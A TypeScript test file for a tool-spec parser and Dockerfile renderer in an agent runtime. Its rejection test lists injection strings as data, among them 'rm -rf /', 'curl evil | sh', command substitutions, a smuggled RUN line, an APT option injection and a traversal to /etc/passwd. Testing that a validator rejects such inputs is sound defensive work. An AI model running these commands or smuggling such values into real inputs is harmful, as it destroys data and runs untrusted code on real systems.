import { describe, expect, it } from "vite-plus/test";

import {
  installCommandsForTool,
  normalizeRuntimeTools,
  parseRuntimeToolSpec,
  renderToolsDockerfile,
  runtimeBaseImageFingerprint,
  runtimeToolsHash,
  runtimeToolsImageTag,
  runtimeToolsOwnerFor,
} from "./RuntimeTools.ts";

describe("parseRuntimeToolSpec", () => {
  it("accepts package names, version pins, and https downloads", () => {
    for (const spec of [
      "apt:jq",
      "apt:libssl3=3.0.13-0ubuntu3",
      "apt:g++",
      "pip:ansible-core==2.17.1",
      "pip:ruamel.yaml",
      "npm:@scope/tool@1.2.3",
      "npm:prettier",
      "url:https://github.com/x/y/releases/download/v1.0/tool-linux-amd64 /usr/local/bin/tool",
    ]) {
      const parsed = parseRuntimeToolSpec(spec);
      expect(parsed.ok, spec).toBe(true);
    }
    const url = parseRuntimeToolSpec("  url:https://example.com/t   /usr/local/bin/t ");
    expect(url.ok && url.tool.spec).toBe("url:https://example.com/t /usr/local/bin/t");
  });

  it("rejects injection attempts and unsafe destinations", () => {
    for (const spec of [
      "apt:jq; rm -rf /",
      "apt:jq && curl evil | sh",
      "apt:$(whoami)",
      "apt:`id`",
      "apt:jq\nRUN curl evil",
      "apt:-o=APT::Update::Pre-Invoke::=id",
      "apt:JQ",
      "pip:requests; echo",
      "pip:git+https://example.com/repo",
      "pip:../local",
      "npm:file:../x",
      "npm:tool@$(id)",
      "npm:git+ssh://x",
      "url:http://example.com/tool /usr/local/bin/tool",
      "url:https://example.com/'tool /usr/local/bin/tool",
      "url:https://example.com/$(id) /usr/local/bin/tool",
      "url:https://example.com/t /usr/local/bin/tool extra",
      "url:https://example.com/t relative/path",
      "url:https://example.com/t /usr/local/../../etc/passwd",
      "url:https://example.com/t /workspace/tool",
      "url:https://example.com/t /runtime/home/.local/bin/tool",
      "url:https://example.com/t /usr/local/bin/",
      "brew:jq",
      "jq",
    ]) {
      expect(parseRuntimeToolSpec(spec).ok, spec).toBe(false);
    }
  });
});

describe("derived image", () => {
  const tools = normalizeRuntimeTools([
    "npm:prettier",
    "apt:jq",
    "url:https://example.com/t /usr/local/bin/t",
    "pip:ansible-core",
    "apt:htop",
    "apt:jq",
  ]);

  it("maps the tools hash and base fingerprint to a tag", () => {
    const hash = runtimeToolsHash(tools);
    expect(hash).toMatch(/^[0-9a-f]{12}$/);
    expect(runtimeToolsHash(normalizeRuntimeTools([]))).toBe("none");
    const base = runtimeBaseImageFingerprint("sha256:abc");
    expect(runtimeToolsImageTag(base, hash)).toBe(`homelab-agent-runtime:${base}-${hash}`);
    // Order and duplicates don't change the hash; a different list does.
    expect(runtimeToolsHash(normalizeRuntimeTools([...tools].reverse().map((t) => t.spec)))).toBe(
      hash,
    );
    expect(runtimeToolsHash(normalizeRuntimeTools(["apt:jq"]))).not.toBe(hash);
    expect(runtimeBaseImageFingerprint("sha256:def")).not.toBe(base);
  });

  it("renders a deterministic Dockerfile with one layer per kind", () => {
    const dockerfile = renderToolsDockerfile("homelab-agent-runtime:local", tools);
    expect(dockerfile).toBe(
      renderToolsDockerfile("homelab-agent-runtime:local", [...tools].reverse()),
    );
    expect(dockerfile.split("\n")).toEqual([
      "FROM homelab-agent-runtime:local",
      "RUN apt-get update && DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends 'htop' 'jq' && rm -rf /var/lib/apt/lists/*",
      "RUN python3 -m pip install --break-system-packages --no-cache-dir 'ansible-core'",
      "RUN npm install -g 'prettier' && npm cache clean --force",
      "RUN mkdir -p '/usr/local/bin' && curl -fsSL 'https://example.com/t' -o '/usr/local/bin/t' && chmod 0755 '/usr/local/bin/t'",
      "",
    ]);
    // Removing a tool drops it from the next build.
    const without = renderToolsDockerfile(
      "homelab-agent-runtime:local",
      tools.filter((tool) => tool.spec !== "apt:htop"),
    );
    expect(without).not.toMatch(/htop/);
    expect(without).toMatch(/'jq'/);
  });

  it("installs into a live container without a shell", () => {
    const [jq] = normalizeRuntimeTools(["apt:jq"]);
    expect(jq && installCommandsForTool(jq)).toEqual([
      ["apt-get", "update"],
      ["apt-get", "install", "-y", "--no-install-recommends", "jq"],
    ]);
  });

  it("gives the shared project runtime the project list and every other runtime its own", () => {
    expect(
      runtimeToolsOwnerFor({
        runtimeId: "project-runtime:p",
        projectId: "p",
        runtimeKind: "project-shared",
      }),
    ).toEqual({ kind: "project", projectId: "p" });
    expect(
      runtimeToolsOwnerFor({ runtimeId: "project-runtime:p", projectId: "p", runtimeKind: null }),
    ).toEqual({ kind: "project", projectId: "p" });
    expect(
      runtimeToolsOwnerFor({
        runtimeId: "isolated-runtime:t",
        projectId: "p",
        runtimeKind: "project-isolated",
      }),
    ).toEqual({ kind: "runtime", projectId: "p", runtimeId: "isolated-runtime:t" });
    expect(
      runtimeToolsOwnerFor({ runtimeId: "x", projectId: null, runtimeKind: null }),
    ).toBeUndefined();
  });
});
